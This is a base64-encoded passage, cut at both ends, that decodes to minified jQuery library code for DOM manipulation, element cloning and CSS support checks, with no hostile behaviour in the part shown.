gcmV0dXJuIHZvaWQgMCA9PT0gYiB8fCBiICYmIG0ubm9kZU5hbWUoYSwgYikgPyBtLm1lcmdlKFthXSwgZikgOiBmIH0gZnVuY3Rpb24gdmIoYSkgeyBXLnRlc3QoYS50eXBlKSAmJiAoYS5kZWZhdWx0Q2hlY2tlZCA9IGEuY2hlY2tlZCkgfSBmdW5jdGlvbiB3YihhLCBiKSB7IHJldHVybiBtLm5vZGVOYW1lKGEsICJ0YWJsZSIpICYmIG0ubm9kZU5hbWUoMTEgIT09IGIubm9kZVR5cGUgPyBiIDogYi5maXJzdENoaWxkLCAidHIiKSA/IGEuZ2V0RWxlbWVudHNCeVRhZ05hbWUoInRib2R5IilbMF0gfHwgYS5hcHBlbmRDaGlsZChhLm93bmVyRG9jdW1lbnQuY3JlYXRlRWxlbWVudCgidGJvZHkiKSkgOiBhIH0gZnVuY3Rpb24geGIoYSkgeyByZXR1cm4gYS50eXBlID0gKG51bGwgIT09IG0uZmluZC5hdHRyKGEsICJ0eXBlIikpICsgIi8iICsgYS50eXBlLCBhIH0gZnVuY3Rpb24geWIoYSkgeyB2YXIgYiA9IHBiLmV4ZWMoYS50eXBlKTsgcmV0dXJuIGIgPyBhLnR5cGUgPSBiWzFdIDogYS5yZW1vdmVBdHRyaWJ1dGUoInR5cGUiKSwgYSB9IGZ1bmN0aW9uIHpiKGEsIGIpIHsgZm9yICh2YXIgYywgZCA9IDA7IG51bGwgIT0gKGMgPSBhW2RdKSA7IGQrKykgbS5fZGF0YShjLCAiZ2xvYmFsRXZhbCIsICFiIHx8IG0uX2RhdGEoYltkXSwgImdsb2JhbEV2YWwiKSkgfSBmdW5jdGlvbiBBYihhLCBiKSB7IGlmICgxID09PSBiLm5vZGVUeXBlICYmIG0uaGFzRGF0YShhKSkgeyB2YXIgYywgZCwgZSwgZiA9IG0uX2RhdGEoYSksIGcgPSBtLl9kYXRhKGIsIGYpLCBoID0gZi5ldmVudHM7IGlmIChoKSB7IGRlbGV0ZSBnLmhhbmRsZSwgZy5ldmVudHMgPSB7fTsgZm9yIChjIGluIGgpIGZvciAoZCA9IDAsIGUgPSBoW2NdLmxlbmd0aDsgZSA+IGQ7IGQrKykgbS5ldmVudC5hZGQoYiwgYywgaFtjXVtkXSkgfSBnLmRhdGEgJiYgKGcuZGF0YSA9IG0uZXh0ZW5kKHt9LCBnLmRhdGEpKSB9IH0gZnVuY3Rpb24gQmIoYSwgYikgeyB2YXIgYywgZCwgZTsgaWYgKDEgPT09IGIubm9kZVR5cGUpIHsgaWYgKGMgPSBiLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCksICFrLm5vQ2xvbmVFdmVudCAmJiBiW20uZXhwYW5kb10pIHsgZSA9IG0uX2RhdGEoYik7IGZvciAoZCBpbiBlLmV2ZW50cykgbS5yZW1vdmVFdmVudChiLCBkLCBlLmhhbmRsZSk7IGIucmVtb3ZlQXR0cmlidXRlKG0uZXhwYW5kbykgfSAic2NyaXB0IiA9PT0gYyAmJiBiLnRleHQgIT09IGEudGV4dCA/ICh4YihiKS50ZXh0ID0gYS50ZXh0LCB5YihiKSkgOiAib2JqZWN0IiA9PT0gYyA/IChiLnBhcmVudE5vZGUgJiYgKGIub3V0ZXJIVE1MID0gYS5vdXRlckhUTUwpLCBrLmh0bWw1Q2xvbmUgJiYgYS5pbm5lckhUTUwgJiYgIW0udHJpbShiLmlubmVySFRNTCkgJiYgKGIuaW5uZXJIVE1MID0gYS5pbm5lckhUTUwpKSA6ICJpbnB1dCIgPT09IGMgJiYgVy50ZXN0KGEudHlwZSkgPyAoYi5kZWZhdWx0Q2hlY2tlZCA9IGIuY2hlY2tlZCA9IGEuY2hlY2tlZCwgYi52YWx1ZSAhPT0gYS52YWx1ZSAmJiAoYi52YWx1ZSA9IGEudmFsdWUpKSA6ICJvcHRpb24iID09PSBjID8gYi5kZWZhdWx0U2VsZWN0ZWQgPSBiLnNlbGVjdGVkID0gYS5kZWZhdWx0U2VsZWN0ZWQgOiAoImlucHV0IiA9PT0gYyB8fCAidGV4dGFyZWEiID09PSBjKSAmJiAoYi5kZWZhdWx0VmFsdWUgPSBhLmRlZmF1bHRWYWx1ZSkgfSB9IG0uZXh0ZW5kKHsgY2xvbmU6IGZ1bmN0aW9uIChhLCBiLCBjKSB7IHZhciBkLCBlLCBmLCBnLCBoLCBpID0gbS5jb250YWlucyhhLm93bmVyRG9jdW1lbnQsIGEpOyBpZiAoay5odG1sNUNsb25lIHx8IG0uaXNYTUxEb2MoYSkgfHwgIWdiLnRlc3QoIjwiICsgYS5ub2RlTmFtZSArICI+IikgPyBmID0gYS5jbG9uZU5vZGUoITApIDogKHRiLmlubmVySFRNTCA9IGEub3V0ZXJIVE1MLCB0Yi5yZW1vdmVDaGlsZChmID0gdGIuZmlyc3RDaGlsZCkpLCAhKGsubm9DbG9uZUV2ZW50ICYmIGsubm9DbG9uZUNoZWNrZWQgfHwgMSAhPT0gYS5ub2RlVHlwZSAmJiAxMSAhPT0gYS5ub2RlVHlwZSB8fCBtLmlzWE1MRG9jKGEpKSkgZm9yIChkID0gdWIoZiksIGggPSB1YihhKSwgZyA9IDA7IG51bGwgIT0gKGUgPSBoW2ddKSA7ICsrZykgZFtnXSAmJiBCYihlLCBkW2ddKTsgaWYgKGIpIGlmIChjKSBmb3IgKGggPSBoIHx8IHViKGEpLCBkID0gZCB8fCB1YihmKSwgZyA9IDA7IG51bGwgIT0gKGUgPSBoW2ddKSA7IGcrKykgQWIoZSwgZFtnXSk7IGVsc2UgQWIoYSwgZik7IHJldHVybiBkID0gdWIoZiwgInNjcmlwdCIpLCBkLmxlbmd0aCA+IDAgJiYgemIoZCwgIWkgJiYgdWIoYSwgInNjcmlwdCIpKSwgZCA9IGggPSBlID0gbnVsbCwgZiB9LCBidWlsZEZyYWdtZW50OiBmdW5jdGlvbiAoYSwgYiwgYywgZCkgeyBmb3IgKHZhciBlLCBmLCBnLCBoLCBpLCBqLCBsLCBuID0gYS5sZW5ndGgsIG8gPSBkYihiKSwgcCA9IFtdLCBxID0gMDsgbiA+IHE7IHErKykgaWYgKGYgPSBhW3FdLCBmIHx8IDAgPT09IGYpIGlmICgib2JqZWN0IiA9PT0gbS50eXBlKGYpKSBtLm1lcmdlKHAsIGYubm9kZVR5cGUgPyBbZl0gOiBmKTsgZWxzZSBpZiAobGIudGVzdChmKSkgeyBoID0gaCB8fCBvLmFwcGVuZENoaWxkKGIuY3JlYXRlRWxlbWVudCgiZGl2IikpLCBpID0gKGpiLmV4ZWMoZikgfHwgWyIiLCAiIl0pWzFdLnRvTG93ZXJDYXNlKCksIGwgPSByYltpXSB8fCByYi5fZGVmYXVsdCwgaC5pbm5lckhUTUwgPSBsWzFdICsgZi5yZXBsYWNlKGliLCAiPCQxPjwvJDI+IikgKyBsWzJdLCBlID0gbFswXTsgd2hpbGUgKGUtLSkgaCA9IGgubGFzdENoaWxkOyBpZiAoIWsubGVhZGluZ1doaXRlc3BhY2UgJiYgaGIudGVzdChmKSAmJiBwLnB1c2goYi5jcmVhdGVUZXh0Tm9kZShoYi5leGVjKGYpWzBdKSksICFrLnRib2R5KSB7IGYgPSAidGFibGUiICE9PSBpIHx8IGtiLnRlc3QoZikgPyAiPHRhYmxlPiIgIT09IGxbMV0gfHwga2IudGVzdChmKSA/IDAgOiBoIDogaC5maXJzdENoaWxkLCBlID0gZiAmJiBmLmNoaWxkTm9kZXMubGVuZ3RoOyB3aGlsZSAoZS0tKSBtLm5vZGVOYW1lKGogPSBmLmNoaWxkTm9kZXNbZV0sICJ0Ym9keSIpICYmICFqLmNoaWxkTm9kZXMubGVuZ3RoICYmIGYucmVtb3ZlQ2hpbGQoaikgfSBtLm1lcmdlKHAsIGguY2hpbGROb2RlcyksIGgudGV4dENvbnRlbnQgPSAiIjsgd2hpbGUgKGguZmlyc3RDaGlsZCkgaC5yZW1vdmVDaGlsZChoLmZpcnN0Q2hpbGQpOyBoID0gby5sYXN0Q2hpbGQgfSBlbHNlIHAucHVzaChiLmNyZWF0ZVRleHROb2RlKGYpKTsgaCAmJiBvLnJlbW92ZUNoaWxkKGgpLCBrLmFwcGVuZENoZWNrZWQgfHwgbS5ncmVwKHViKHAsICJpbnB1dCIpLCB2YiksIHEgPSAwOyB3aGlsZSAoZiA9IHBbcSsrXSkgaWYgKCghZCB8fCAtMSA9PT0gbS5pbkFycmF5KGYsIGQpKSAmJiAoZyA9IG0uY29udGFpbnMoZi5vd25lckRvY3VtZW50LCBmKSwgaCA9IHViKG8uYXBwZW5kQ2hpbGQoZiksICJzY3JpcHQiKSwgZyAmJiB6YihoKSwgYykpIHsgZSA9IDA7IHdoaWxlIChmID0gaFtlKytdKSBvYi50ZXN0KGYudHlwZSB8fCAiIikgJiYgYy5wdXNoKGYpIH0gcmV0dXJuIGggPSBudWxsLCBvIH0sIGNsZWFuRGF0YTogZnVuY3Rpb24gKGEsIGIpIHsgZm9yICh2YXIgZCwgZSwgZiwgZywgaCA9IDAsIGkgPSBtLmV4cGFuZG8sIGogPSBtLmNhY2hlLCBsID0gay5kZWxldGVFeHBhbmRvLCBuID0gbS5ldmVudC5zcGVjaWFsOyBudWxsICE9IChkID0gYVtoXSkgOyBoKyspIGlmICgoYiB8fCBtLmFjY2VwdERhdGEoZCkpICYmIChmID0gZFtpXSwgZyA9IGYgJiYgaltmXSkpIHsgaWYgKGcuZXZlbnRzKSBmb3IgKGUgaW4gZy5ldmVudHMpIG5bZV0gPyBtLmV2ZW50LnJlbW92ZShkLCBlKSA6IG0ucmVtb3ZlRXZlbnQoZCwgZSwgZy5oYW5kbGUpOyBqW2ZdICYmIChkZWxldGUgaltmXSwgbCA/IGRlbGV0ZSBkW2ldIDogdHlwZW9mIGQucmVtb3ZlQXR0cmlidXRlICE9PSBLID8gZC5yZW1vdmVBdHRyaWJ1dGUoaSkgOiBkW2ldID0gbnVsbCwgYy5wdXNoKGYpKSB9IH0gfSksIG0uZm4uZXh0ZW5kKHsgdGV4dDogZnVuY3Rpb24gKGEpIHsgcmV0dXJuIFYodGhpcywgZnVuY3Rpb24gKGEpIHsgcmV0dXJuIHZvaWQgMCA9PT0gYSA/IG0udGV4dCh0aGlzKSA6IHRoaXMuZW1wdHkoKS5hcHBlbmQoKHRoaXNbMF0gJiYgdGhpc1swXS5vd25lckRvY3VtZW50IHx8IHkpLmNyZWF0ZVRleHROb2RlKGEpKSB9LCBudWxsLCBhLCBhcmd1bWVudHMubGVuZ3RoKSB9LCBhcHBlbmQ6IGZ1bmN0aW9uICgpIHsgcmV0dXJuIHRoaXMuZG9tTWFuaXAoYXJndW1lbnRzLCBmdW5jdGlvbiAoYSkgeyBpZiAoMSA9PT0gdGhpcy5ub2RlVHlwZSB8fCAxMSA9PT0gdGhpcy5ub2RlVHlwZSB8fCA5ID09PSB0aGlzLm5vZGVUeXBlKSB7IHZhciBiID0gd2IodGhpcywgYSk7IGIuYXBwZW5kQ2hpbGQoYSkgfSB9KSB9LCBwcmVwZW5kOiBmdW5jdGlvbiAoKSB7IHJldHVybiB0aGlzLmRvbU1hbmlwKGFyZ3VtZW50cywgZnVuY3Rpb24gKGEpIHsgaWYgKDEgPT09IHRoaXMubm9kZVR5cGUgfHwgMTEgPT09IHRoaXMubm9kZVR5cGUgfHwgOSA9PT0gdGhpcy5ub2RlVHlwZSkgeyB2YXIgYiA9IHdiKHRoaXMsIGEpOyBiLmluc2VydEJlZm9yZShhLCBiLmZpcnN0Q2hpbGQpIH0gfSkgfSwgYmVmb3JlOiBmdW5jdGlvbiAoKSB7IHJldHVybiB0aGlzLmRvbU1hbmlwKGFyZ3VtZW50cywgZnVuY3Rpb24gKGEpIHsgdGhpcy5wYXJlbnROb2RlICYmIHRoaXMucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUoYSwgdGhpcykgfSkgfSwgYWZ0ZXI6IGZ1bmN0aW9uICgpIHsgcmV0dXJuIHRoaXMuZG9tTWFuaXAoYXJndW1lbnRzLCBmdW5jdGlvbiAoYSkgeyB0aGlzLnBhcmVudE5vZGUgJiYgdGhpcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCB0aGlzLm5leHRTaWJsaW5nKSB9KSB9LCByZW1vdmU6IGZ1bmN0aW9uIChhLCBiKSB7IGZvciAodmFyIGMsIGQgPSBhID8gbS5maWx0ZXIoYSwgdGhpcykgOiB0aGlzLCBlID0gMDsgbnVsbCAhPSAoYyA9IGRbZV0pIDsgZSsrKSBiIHx8IDEgIT09IGMubm9kZVR5cGUgfHwgbS5jbGVhbkRhdGEodWIoYykpLCBjLnBhcmVudE5vZGUgJiYgKGIgJiYgbS5jb250YWlucyhjLm93bmVyRG9jdW1lbnQsIGMpICYmIHpiKHViKGMsICJzY3JpcHQiKSksIGMucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChjKSk7IHJldHVybiB0aGlzIH0sIGVtcHR5OiBmdW5jdGlvbiAoKSB7IGZvciAodmFyIGEsIGIgPSAwOyBudWxsICE9IChhID0gdGhpc1tiXSkgOyBiKyspIHsgMSA9PT0gYS5ub2RlVHlwZSAmJiBtLmNsZWFuRGF0YSh1YihhLCAhMSkpOyB3aGlsZSAoYS5maXJzdENoaWxkKSBhLnJlbW92ZUNoaWxkKGEuZmlyc3RDaGlsZCk7IGEub3B0aW9ucyAmJiBtLm5vZGVOYW1lKGEsICJzZWxlY3QiKSAmJiAoYS5vcHRpb25zLmxlbmd0aCA9IDApIH0gcmV0dXJuIHRoaXMgfSwgY2xvbmU6IGZ1bmN0aW9uIChhLCBiKSB7IHJldHVybiBhID0gbnVsbCA9PSBhID8gITEgOiBhLCBiID0gbnVsbCA9PSBiID8gYSA6IGIsIHRoaXMubWFwKGZ1bmN0aW9uICgpIHsgcmV0dXJuIG0uY2xvbmUodGhpcywgYSwgYikgfSkgfSwgaHRtbDogZnVuY3Rpb24gKGEpIHsgcmV0dXJuIFYodGhpcywgZnVuY3Rpb24gKGEpIHsgdmFyIGIgPSB0aGlzWzBdIHx8IHt9LCBjID0gMCwgZCA9IHRoaXMubGVuZ3RoOyBpZiAodm9pZCAwID09PSBhKSByZXR1cm4gMSA9PT0gYi5ub2RlVHlwZSA/IGIuaW5uZXJIVE1MLnJlcGxhY2UoZmIsICIiKSA6IHZvaWQgMDsgaWYgKCEoInN0cmluZyIgIT0gdHlwZW9mIGEgfHwgbWIudGVzdChhKSB8fCAhay5odG1sU2VyaWFsaXplICYmIGdiLnRlc3QoYSkgfHwgIWsubGVhZGluZ1doaXRlc3BhY2UgJiYgaGIudGVzdChhKSB8fCByYlsoamIuZXhlYyhhKSB8fCBbIiIsICIiXSlbMV0udG9Mb3dlckNhc2UoKV0pKSB7IGEgPSBhLnJlcGxhY2UoaWIsICI8JDE+PC8kMj4iKTsgdHJ5IHsgZm9yICg7IGQgPiBjOyBjKyspIGIgPSB0aGlzW2NdIHx8IHt9LCAxID09PSBiLm5vZGVUeXBlICYmIChtLmNsZWFuRGF0YSh1YihiLCAhMSkpLCBiLmlubmVySFRNTCA9IGEpOyBiID0gMCB9IGNhdGNoIChlKSB7IH0gfSBiICYmIHRoaXMuZW1wdHkoKS5hcHBlbmQoYSkgfSwgbnVsbCwgYSwgYXJndW1lbnRzLmxlbmd0aCkgfSwgcmVwbGFjZVdpdGg6IGZ1bmN0aW9uICgpIHsgdmFyIGEgPSBhcmd1bWVudHNbMF07IHJldHVybiB0aGlzLmRvbU1hbmlwKGFyZ3VtZW50cywgZnVuY3Rpb24gKGIpIHsgYSA9IHRoaXMucGFyZW50Tm9kZSwgbS5jbGVhbkRhdGEodWIodGhpcykpLCBhICYmIGEucmVwbGFjZUNoaWxkKGIsIHRoaXMpIH0pLCBhICYmIChhLmxlbmd0aCB8fCBhLm5vZGVUeXBlKSA/IHRoaXMgOiB0aGlzLnJlbW92ZSgpIH0sIGRldGFjaDogZnVuY3Rpb24gKGEpIHsgcmV0dXJuIHRoaXMucmVtb3ZlKGEsICEwKSB9LCBkb21NYW5pcDogZnVuY3Rpb24gKGEsIGIpIHsgYSA9IGUuYXBwbHkoW10sIGEpOyB2YXIgYywgZCwgZiwgZywgaCwgaSwgaiA9IDAsIGwgPSB0aGlzLmxlbmd0aCwgbiA9IHRoaXMsIG8gPSBsIC0gMSwgcCA9IGFbMF0sIHEgPSBtLmlzRnVuY3Rpb24ocCk7IGlmIChxIHx8IGwgPiAxICYmICJzdHJpbmciID09IHR5cGVvZiBwICYmICFrLmNoZWNrQ2xvbmUgJiYgbmIudGVzdChwKSkgcmV0dXJuIHRoaXMuZWFjaChmdW5jdGlvbiAoYykgeyB2YXIgZCA9IG4uZXEoYyk7IHEgJiYgKGFbMF0gPSBwLmNhbGwodGhpcywgYywgZC5odG1sKCkpKSwgZC5kb21NYW5pcChhLCBiKSB9KTsgaWYgKGwgJiYgKGkgPSBtLmJ1aWxkRnJhZ21lbnQoYSwgdGhpc1swXS5vd25lckRvY3VtZW50LCAhMSwgdGhpcyksIGMgPSBpLmZpcnN0Q2hpbGQsIDEgPT09IGkuY2hpbGROb2Rlcy5sZW5ndGggJiYgKGkgPSBjKSwgYykpIHsgZm9yIChnID0gbS5tYXAodWIoaSwgInNjcmlwdCIpLCB4YiksIGYgPSBnLmxlbmd0aDsgbCA+IGo7IGorKykgZCA9IGksIGogIT09IG8gJiYgKGQgPSBtLmNsb25lKGQsICEwLCAhMCksIGYgJiYgbS5tZXJnZShnLCB1YihkLCAic2NyaXB0IikpKSwgYi5jYWxsKHRoaXNbal0sIGQsIGopOyBpZiAoZikgZm9yIChoID0gZ1tnLmxlbmd0aCAtIDFdLm93bmVyRG9jdW1lbnQsIG0ubWFwKGcsIHliKSwgaiA9IDA7IGYgPiBqOyBqKyspIGQgPSBnW2pdLCBvYi50ZXN0KGQudHlwZSB8fCAiIikgJiYgIW0uX2RhdGEoZCwgImdsb2JhbEV2YWwiKSAmJiBtLmNvbnRhaW5zKGgsIGQpICYmIChkLnNyYyA/IG0uX2V2YWxVcmwgJiYgbS5fZXZhbFVybChkLnNyYykgOiBtLmdsb2JhbEV2YWwoKGQudGV4dCB8fCBkLnRleHRDb250ZW50IHx8IGQuaW5uZXJIVE1MIHx8ICIiKS5yZXBsYWNlKHFiLCAiIikpKTsgaSA9IGMgPSBudWxsIH0gcmV0dXJuIHRoaXMgfSB9KSwgbS5lYWNoKHsgYXBwZW5kVG86ICJhcHBlbmQiLCBwcmVwZW5kVG86ICJwcmVwZW5kIiwgaW5zZXJ0QmVmb3JlOiAiYmVmb3JlIiwgaW5zZXJ0QWZ0ZXI6ICJhZnRlciIsIHJlcGxhY2VBbGw6ICJyZXBsYWNlV2l0aCIgfSwgZnVuY3Rpb24gKGEsIGIpIHsgbS5mblthXSA9IGZ1bmN0aW9uIChhKSB7IGZvciAodmFyIGMsIGQgPSAwLCBlID0gW10sIGcgPSBtKGEpLCBoID0gZy5sZW5ndGggLSAxOyBoID49IGQ7IGQrKykgYyA9IGQgPT09IGggPyB0aGlzIDogdGhpcy5jbG9uZSghMCksIG0oZ1tkXSlbYl0oYyksIGYuYXBwbHkoZSwgYy5nZXQoKSk7IHJldHVybiB0aGlzLnB1c2hTdGFjayhlKSB9IH0pOyB2YXIgQ2IsIERiID0ge307IGZ1bmN0aW9uIEViKGIsIGMpIHsgdmFyIGQsIGUgPSBtKGMuY3JlYXRlRWxlbWVudChiKSkuYXBwZW5kVG8oYy5ib2R5KSwgZiA9IGEuZ2V0RGVmYXVsdENvbXB1dGVkU3R5bGUgJiYgKGQgPSBhLmdldERlZmF1bHRDb21wdXRlZFN0eWxlKGVbMF0pKSA/IGQuZGlzcGxheSA6IG0uY3NzKGVbMF0sICJkaXNwbGF5Iik7IHJldHVybiBlLmRldGFjaCgpLCBmIH0gZnVuY3Rpb24gRmIoYSkgeyB2YXIgYiA9IHksIGMgPSBEYlthXTsgcmV0dXJuIGMgfHwgKGMgPSBFYihhLCBiKSwgIm5vbmUiICE9PSBjICYmIGMgfHwgKENiID0gKENiIHx8IG0oIjxpZnJhbWUgZnJhbWVib3JkZXI9JzAnIHdpZHRoPScwJyBoZWlnaHQ9JzAnLz4iKSkuYXBwZW5kVG8oYi5kb2N1bWVudEVsZW1lbnQpLCBiID0gKENiWzBdLmNvbnRlbnRXaW5kb3cgfHwgQ2JbMF0uY29udGVudERvY3VtZW50KS5kb2N1bWVudCwgYi53cml0ZSgpLCBiLmNsb3NlKCksIGMgPSBFYihhLCBiKSwgQ2IuZGV0YWNoKCkpLCBEYlthXSA9IGMpLCBjIH0gIWZ1bmN0aW9uICgpIHsgdmFyIGE7IGsuc2hyaW5rV3JhcEJsb2NrcyA9IGZ1bmN0aW9uICgpIHsgaWYgKG51bGwgIT0gYSkgcmV0dXJuIGE7IGEgPSAhMTsgdmFyIGIsIGMsIGQ7IHJldHVybiBjID0geS5nZXRFbGVtZW50c0J5VGFnTmFtZSgiYm9keSIpWzBdLCBjICYmIGMuc3R5bGUgPyAoYiA9IHkuY3JlYXRlRWxlbWVudCgiZGl2IiksIGQgPSB5LmNyZWF0ZUVsZW1lbnQoImRpdiIpLCBkLnN0eWxlLmNzc1RleHQgPSAicG9zaXRpb246YWJzb2x1dGU7Ym9yZGVyOjA7d2lkdGg6MDtoZWlnaHQ6MDt0b3A6MDtsZWZ0Oi05OTk5cHgiLCBjLmFwcGVuZENoaWxkKGQpLmFwcGVuZENoaWxkKGIpLCB0eXBlb2YgYi5zdHlsZS56b29tICE9PSBLICYmIChiLnN0eWxlLmNzc1RleHQgPSAiLXdlYmtpdC1ib3gtc2l6aW5nOmNvbnRlbnQtYm94Oy1tb3otYm94LXNpemluZzpjb250ZW50LWJveDtib3gtc2l6aW5nOmNvbnRlbnQtYm94O2Rpc3BsYXk6YmxvY2s7bWFyZ2luOjA7Ym9yZGVyOjA7cGFkZGluZzoxcHg7d2lkdGg6MXB4O3pvb206MSIsIGIuYXBwZW5kQ2hpbGQoeS5jcmVhdGVFbGVtZW50KCJkaXYiKSkuc3R5bGUud2lkdGggPSAiNXB4IiwgYSA9IDMgIT09IGIub2Zmc2V0V2lkdGgpLCBjLnJlbW92ZUNoaWxkKGQpLCBhKSA6IHZvaWQgMCB9IH0oKTsgdmFyIEdiID0gL15tYXJnaW4vLCBIYiA9IG5ldyBSZWdFeHAoIl4oIiArIFMgKyAiKSg/IXB4KVthLXolXSskIiwgImkiKSwgSWIsIEpiLCBLYiA9IC9eKHRvcHxyaWdodHxib3R0b218bGVmdCkkLzsgYS5nZXRDb21wdXRlZFN0eWxlID8gKEliID0gZnVuY3Rpb24gKGEpIHsgcmV0dXJuIGEub3duZXJEb2N1bWVudC5kZWZhdWx0Vmlldy5nZXRDb21wdXRlZFN0eWxlKGEsIG51bGwpIH0sIEpiID0gZnVuY3Rpb24gKGEsIGIsIGMpIHsgdmFyIGQsIGUsIGYsIGcsIGggPSBhLnN0eWxlOyByZXR1cm4gYyA9IGMgfHwgSWIoYSksIGcgPSBjID8gYy5nZXRQcm9wZXJ0eVZhbHVlKGIpIHx8IGNbYl0gOiB2b2lkIDAsIGMgJiYgKCIiICE9PSBnIHx8IG0uY29udGFpbnMoYS5vd25lckRvY3VtZW50LCBhKSB8fCAoZyA9IG0uc3R5bGUoYSwgYikpLCBIYi50ZXN0KGcpICYmIEdiLnRlc3QoYikgJiYgKGQgPSBoLndpZHRoLCBlID0gaC5taW5XaWR0aCwgZiA9IGgubWF4V2lkdGgsIGgubWluV2lkdGggPSBoLm1heFdpZHRoID0gaC53aWR0aCA9IGcsIGcgPSBjLndpZHRoLCBoLndpZHRoID0gZCwgaC5taW5XaWR0aCA9IGUsIGgubWF4V2lkdGggPSBmKSksIHZvaWQgMCA9PT0gZyA/IGcgOiBnICsgIiIgfSkgOiB5LmRvY3VtZW50RWxlbWVudC5jdXJyZW50U3R5bGUgJiYgKEliID0gZnVuY3Rpb24gKGEpIHsgcmV0dXJuIGEuY3VycmVudFN0eWxlIH0sIEpiID0gZnVuY3Rpb24gKGEsIGIsIGMpIHsgdmFyIGQsIGUsIGYsIGcsIGggPSBhLnN0eWxlOyByZXR1cm4gYyA9IGMgfHwgSWIoYSksIGcgPSBjID8gY1tiXSA6IHZvaWQgMCwgbnVsbCA9PSBnICYmIGggJiYgaFtiXSAmJiAoZyA9IGhbYl0pLCBIYi50ZXN0KGcpICYmICFLYi50ZXN0KGIpICYmIChkID0gaC5sZWZ0LCBlID0gYS5ydW50aW1lU3R5bGUsIGYgPSBlICYmIGUubGVmdCwgZiAmJiAoZS5sZWZ0ID0gYS5jdXJyZW50U3R5bGUubGVmdCksIGgubGVmdCA9ICJmb250U2l6ZSIgPT09IGIgPyAiMWVtIiA6IGcsIGcgPSBoLnBpeGVsTGVmdCArICJweCIsIGgubGVmdCA9IGQsIGYgJiYgKGUubGVmdCA9IGYpKSwgdm9pZCAwID09PSBnID8gZyA6IGcgKyAiIiB8fCAiYXV0byIgfSk7IGZ1bmN0aW9uIExiKGEsIGIpIHsgcmV0dXJuIHsgZ2V0OiBmdW5jdGlvbiAoKSB7IHZhciBjID0gYSgpOyBpZiAobnVsbCAhPSBjKSByZXR1cm4gYyA/IHZvaWQgZGVsZXRlIHRoaXMuZ2V0IDogKHRoaXMuZ2V0ID0gYikuYXBwbHkodGhpcywgYXJndW1lbnRzKSB9IH0gfSAhZnVuY3Rpb24gKCkgeyB2YXIgYiwgYywgZCwgZSwgZiwgZywgaDsgaWYgKGIgPSB5LmNyZWF0ZUVsZW1lbnQoImRpdiIpLCBiLmlubmVySFRNTCA9ICIgIDxsaW5rLz48dGFibGU+PC90YWJsZT48YSBocmVmPScvYSc+YTwvYT48aW5wdXQgdHlwZT0nY2hlY2tib3gnLz4iLCBkID0gYi5nZXRFbGVtZW50c0J5VGFnTmFtZSgiYSIpWzBdLCBjID0gZCAmJiBkLnN0eWxlKSB7IGMuY3NzVGV4dCA9ICJmbG9hdDpsZWZ0O29wYWNpdHk6LjUiLCBrLm9wYWNpdHkgPSAiMC41IiA9PT0gYy5vcGFjaXR5LCBrLmNzc0Zsb2F0ID0gISFjLmNzc0Zsb2F0LCBiLnN0eWxlLmJhY2tncm91bmRDbGlwID0gImNvbnRlbnQtYm94IiwgYi5jbG9uZU5vZGUoITApLnN0eWxlLmJhY2tncm91bmRDbGlwID0gIiIsIGsuY2xlYXJDbG9uZVN0eWxlID0gImNvbnRlbnQtYm94IiA9PT0gYi5zdHlsZS5iYWNrZ3JvdW5kQ2xpcCwgay5ib3hTaXppbmcgPSAiIiA9PT0gYy5ib3hTaXppbmcgfHwgIiIgPT09IGMuTW96Qm94U2l6aW5nIHx8ICIiID09PSBjLldlYmtpdEJveFNpemluZywgbS5leHRlbmQoaywgeyByZWxpYWJsZUhpZGRlbk9mZnNldHM6IGZ1bmN0aW9uICgpIHsgcmV0dXJuIG51bGwgPT0gZyAmJiBpKCksIGcgfSwgYm94U2l6aW5nUmVsaWFibGU6IGZ1bmN0aW9uICgpIHsgcmV0dXJuIG51bGwgPT0gZiAmJiBpKCksIGYgfSwgcGl4ZWxQb3NpdGlvbjogZnVuY3Rpb24gKCkgeyByZXR1cm4gbnVsbCA9PSBlICYmIGkoKSwgZSB9LCByZWxpYWJsZU1hcmdpblJpZ2h0OiBmdW5jdGlvbiAoKSB7IHJldHVybiBudWxsID09IGggJiYgaSgpLCBoIH0gfSk7IGZ1bmN0aW9uIGkoKSB7IHZhciBiLCBjLCBkLCBpOyBjID0geS5nZXRFbGVtZW50c0J5VGFnTmFtZSgiYm9keSIpWzBdLCBjICYmIGMuc3R5bGUgJiYgKGIgPSB5LmNyZWF0ZUVsZW1lbnQoImRpdiIpLCBkID0geS5jcmVhdGVFbGVtZW50KCJkaXYiKSwgZC5zdHlsZS5jc3NUZXh0ID0gInBvc2l0aW9uOmFic29sdXRlO2JvcmRlcjowO3dpZHRoOjA7aGVpZ2h0OjA7dG9wOjA7bGVmdDotOTk5OXB4IiwgYy5hcHBlbmRDaGlsZChkKS5hcHBlbmRDaGlsZChiKSwgYi5zdHlsZS5jc3NUZXh0ID0gIi13ZWJraXQtYm94LXNpemluZzpib3JkZXItYm94Oy1tb3otYm94LXNpemluZzpib3JkZXItYm94O2JveC1zaXppbmc6Ym9yZGVyLWJveDtkaXNwbGF5OmJsb2NrO21hcmdpbi10b3A6MSU7dG9wOjElO2JvcmRlcjoxcHg7cGFkZGluZzoxcHg7d2lkdGg6NHB4O3Bvc2l0aW9uOmFic29sdXRlIiwgZSA9IGYgPSAhMSwgaCA9ICEwLCBhLmdldENvbXB1dGVkU3R5bGUgJiYgKGUgPSAiMSUiICE9PSAoYS5nZXRDb21wdXRlZFN0eWxlKGIsIG51bGwpIHx8IHt9KS50b3AsIGYgPSAiNHB4IiA9PT0gKGEuZ2V0Q29tcHV0ZWRTdHlsZShiLCBudWxsKSB8fCB7IHdpZHRoOiAiNHB4IiB9KS53aWR0aCwgaSA9IGIuYXBwZW5kQ2hpbGQoeS5jcmVhdGVFbGVtZW50KCJkaXYiKSksIGkuc3R5bGUuY3NzVGV4dCA9IGIuc3R5bGUuY3NzVGV4dCA9ICItd2Via2l0LWJveC1zaXppbmc6Y29udGVudC1ib3g7LW1vei1ib3gtc2l6aW5nOmNvbnRlbnQtYm94O2JveC1zaXppbmc6Y29udGVudC1ib3g7ZGlzcGxheTpibG9jazttYXJnaW46MDtib3JkZXI6MDtwYWRkaW5nOjAiLCBpLnN0eWxlLm1hcmdpblJpZ2h0ID0gaS5zdHlsZS53aWR0aCA9ICIwIiwgYi5zdHlsZS53aWR0aCA9ICIxcHgiLCBoID0gIXBhcnNlRmxvYXQoKGEuZ2V0Q29tcHV0ZWRTdHlsZShpLCBudWxsKSB8fCB7fSkubWFyZ2luUmlna